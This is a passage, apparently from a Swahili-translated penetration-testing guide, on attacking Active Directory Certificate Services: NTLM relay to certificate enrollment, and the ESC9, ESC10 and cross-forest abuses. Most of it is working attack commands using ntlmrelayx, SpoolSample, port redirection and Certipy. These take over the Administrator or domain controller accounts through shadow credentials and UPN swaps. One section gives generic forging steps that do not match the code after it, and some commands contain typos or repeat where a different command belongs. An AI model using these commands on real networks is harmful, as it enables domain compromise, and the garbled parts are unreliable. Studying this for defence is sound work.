Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Matumizi Mabaya ya Cheti

Kuna njia nyingine ya kufanya uchunguzi wa kina wa mazingira ya AD kwa kutumia cheti cha kughushi. Hii inaweza kusaidia kuvunja mipaka ya usalama na kupata ufikiaji wa juu katika mfumo wa AD. Hapa kuna hatua za kufuata:

1. Tafuta cheti cha kughushi ambacho kinaweza kutumika kwa madhumuni ya uchunguzi.
2. Tumia chombo cha Certify kujenga cheti cha kughushi kwa kutumia maelezo ya cheti halali.
3. Imarisha cheti cha kughushi kwenye mfumo wa AD.
4. Tumia cheti cha kughushi kuingia kwenye mfumo wa AD na kupata ufikiaji wa juu.

Kwa kufuata hatua hizi, unaweza kufanikiwa katika kutekeleza mbinu ya kughushi cheti na kupata ufikiaji wa juu katika mfumo wa AD. Ni muhimu kuzingatia kuwa matumizi mabaya ya cheti ni kinyume cha sheria na inaweza kusababisha mashtaka ya kisheria. Kwa hivyo, ni muhimu kufanya uchunguzi wa kina na kufuata sheria na kanuni zinazotumika katika eneo lako.
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya ya [Certipy](https://github.com/ly4k/Certipy)

Ombi la cheti linafanywa na Certipy kwa cheti cha chaguo-msingi kinachoitwa `Machine` au `User`, kinachotambuliwa na ikiwa jina la akaunti linalotumwa linamalizika na `$`. Maelezo ya kigezo mbadala yanaweza kupatikana kwa kutumia kipengele cha `-template`.

Tekniki kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kutumika kwa kushawishi uthibitisho. Wakati unashughulika na wadhibiti wa kikoa, maelezo ya `-template DomainController` yanahitajika.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Hakuna Kupanua Usalama - ESC9 <a href="#5485" id="5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, inazuia uingizaji wa **uzalishaji mpya wa usalama wa `szOID_NTDS_CA_SECURITY_EXT`** katika cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (chaguo-msingi), ambayo inatofautiana na kuweka kuwa `2`. Umuhimu wake unakuwa mkubwa katika mazingira ambapo uwekaji dhaifu wa cheti kwa Kerberos au Schannel unaweza kutumiwa vibaya (kama katika ESC10), kwani kutokuwepo kwa ESC9 haitabadilisha mahitaji.

Hali ambazo kuweka bendera hii kunakuwa muhimu ni pamoja na:
- `StrongCertificateBindingEnforcement` haijabadilishwa kuwa `2` (chaguo-msingi ikiwa ni `1`), au `CertificateMappingMethods` inajumuisha bendera ya `UPN`.
- Cheti limepewa alama ya bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya kuweka ya `msPKI-Enrollment-Flag`.
- Cheti linataja EKU ya uthibitishaji wa mteja yeyote.
- Mamlaka ya kuandika kwa jumla yanapatikana juu ya akaunti yoyote ili kudhoofisha nyingine.

### Skenario ya Matumizi Mabaya

Fikiria `John@corp.local` ana mamlaka ya kuandika kwa jumla juu ya `Jane@corp.local`, na lengo ni kudhoofisha `Administrator@corp.local`. Kigezo cha cheti cha `ESC9`, ambacho `Jane@corp.local` ameruhusiwa kujiandikisha, kimeundwa na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` katika kuweka yake ya `msPKI-Enrollment-Flag`.

Kwa kuanzia, hash ya `Jane` inapata kutumia Shadow Credentials, shukrani kwa `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Kisha, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, kwa makusudi ikikosa sehemu ya kikoa ya `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Mabadiliko haya hayakiuki vikwazo, ikizingatiwa kuwa `Administrator@corp.local` inabaki kuwa tofauti kama `userPrincipalName` ya `Administrator`.

Kufuatia hili, templeti ya cheti ya `ESC9`, iliyoainishwa kuwa hafifu, inaombwa kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imejulikana kuwa `userPrincipalName` ya cheti inaonyesha `Administrator`, bila "object SID" yoyote.

`userPrincipalName` ya `Jane` basi inarudishwa kwa asili yake, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu uwakiki na cheti kilichotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima iwe na `-domain <domain>` kutokana na kutokuwepo kwa maelezo ya kikoa kwenye cheti:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Uthibitishaji Dhaifu wa Vyeti - ESC10

### Maelezo

ESC10 inahusu thamani mbili za funguo za usajili kwenye kisanduku cha kudhibiti kikoa:

- Thamani ya chaguo-msingi ya `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), hapo awali ilikuwa `0x1F`.
- Mazingira ya chaguo-msingi ya `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, hapo awali ilikuwa `0`.

**Kesi ya 1**

Wakati `StrongCertificateBindingEnforcement` imeundwa kama `0`.

**Kesi ya 2**

Ikiwa `CertificateMappingMethods` inajumuisha biti ya `UPN` (`0x4`).

### Kesi ya Uvunjaji wa Usalama ya 1

Kwa `StrongCertificateBindingEnforcement` iliyoandaliwa kama `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumiwa kudhoofisha akaunti yoyote B.

Kwa mfano, ikiwa akaunti ya `Jane@corp.local` ina ruhusa za `GenericWrite`, mshambuliaji analenga kudhoofisha akaunti ya `Administrator@corp.local`. Mchakato unafanana na ESC9, kuruhusu templeti yoyote ya cheti kutumiwa.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kwa kudhoofisha `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Kisha, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, kwa makusudi ikikosa sehemu ya `@corp.local` ili kuepuka kukiuka kizuizi.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Kufuatia hilo, ombi la cheti linalowezesha uthibitishaji wa mteja linahitajika kama `Jane`, kwa kutumia kigezo cha cheti cha `User` cha msingi.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` kisha inarudishwa kwenye hali yake ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuhalalisha kwa cheti kilichopatikana kutatoa NT hash ya `Administrator@corp.local`, kuhitaji kutaja kikoa katika amri kutokana na kutokuwepo kwa maelezo ya kikoa kwenye cheti.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kesi ya Matumizi 2

Kwa `CertificateMappingMethods` inayojumuisha bendera ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kudhoofisha akaunti yoyote B ambayo haina mali ya `userPrincipalName`, ikiwa ni pamoja na akaunti za mashine na akaunti ya msimamizi wa kujengwa kwenye kikoa, `Administrator`.

Hapa, lengo ni kudhoofisha `DC$@corp.local`, kuanzia na kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` inawekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kinahitajika kwa jina la `Jane` kwa kutumia kigezo cha chaguo-msingi cha `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarudishwa kwenye hali yake ya awali baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Kutambulisha kupitia Schannel, chaguo la `-ldap-shell` la Certipy hutumiwa, ikionyesha mafanikio ya uwakilishi kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia kifaa cha LDAP, amri kama vile `set_rbcd` huwezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kuhatarisha udhibiti wa kikoa.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ukosefu wa `userPrincipalName` au kutokuwepo kwa usawa kati ya `userPrincipalName` na `sAMAccountName` kunaweza kusababisha udhaifu kwa akaunti yoyote ya mtumiaji, na hasa akaunti ya msimamizi ya chaguo-msingi `Administrator@corp.local` kutokana na mamlaka yake ya LDAP na kutokuwepo kwa `userPrincipalName` kwa chaguo-msingi.


## Kuvunja Uaminifu wa Misitu kwa Kutumia Vyeti kwa Njia ya Kusubiri

### Kuvunja Uaminifu wa Misitu kwa Kutumia CA Zilizodukuliwa

Usanidi wa **usajili wa misitu kwa njia ya msitu mwingine** ni rahisi. **Cheti cha CA cha mizizi** kutoka msitu wa rasilimali kinatolewa kwa **misitu ya akaunti** na wahariri, na **vyeti vya CA vya kampuni** kutoka msitu wa rasilimali vinawekwa kwenye vyombo vya **`NTAuthCertificates` na AIA katika kila msitu wa akaunti**. Kwa ufafanuzi, mpangilio huu unampa **CA katika msitu wa rasilimali udhibiti kamili** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itakuwa **imevamiwa na wadukuzi**, vyeti vya watumiaji wote katika misitu ya rasilimali na akaunti vinaweza **kudanganywa na wadukuzi**, hivyo kuvunja kizuizi cha usalama cha msitu.

### Haki za Usajili Zinazotolewa kwa Washiriki wa Kigeni

Katika mazingira ya misitu mingi, tahadhari inahitajika kuhusu CA za Kampuni ambazo **huchapisha templeti za vyeti** ambazo huruhusu **Watumiaji waliothibitishwa au washiriki wa kigeni** (watumiaji/vikundi kutoka nje ya msitu ambao CA ya Kampuni inahusiana nayo) **haki za usajili na uhariri**.\
Baada ya kuthibitishwa kupitia uaminifu, SID ya **Watumiaji waliothibitishwa** inaongezwa kwenye token ya mtumiaji na AD. Hivyo, ikiwa kikoa kina CA ya Kampuni na templeti ambayo **inaruhusu Watumiaji waliothibitishwa kupata haki za usajili**, templeti inaweza **kusajiliwa na mtumiaji kutoka msitu tofauti**. Vivyo hivyo, ikiwa **haki za usajili zinatolewa wazi kwa washiriki wa kigeni kupitia templeti**, uhusiano wa **kudhibiti upatikanaji kati ya misitu tofauti unakuwa umewekwa**, kuruhusu mshiriki kutoka msitu mmoja **kusajiliwa kwenye templeti kutoka msitu mwingine**.

Hali zote mbili zinasababisha **ongezeko la eneo la shambulio** kutoka msitu mmoja hadi mwingine. Mipangilio ya templeti ya cheti inaweza kutumiwa na mshambuliaji kupata mamlaka zaidi katika kikoa cha kigeni.
